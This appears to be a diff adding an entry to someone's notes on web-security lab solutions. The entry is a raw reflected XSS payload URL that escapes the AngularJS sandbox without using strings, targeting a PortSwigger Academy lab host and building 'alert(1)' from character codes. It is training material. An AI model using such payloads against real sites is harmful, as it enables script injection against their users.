@@ -131,6 +131,8 @@ ${alert(1)}
 
 ===
 
+Reflected XSS with AngularJS sandbox escape without strings
+
 // payload:
 // this is raw. make sure to url encode...
 https://0a99003404c0d51780adb77c00cd0044.web-security-academy.net/?search=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
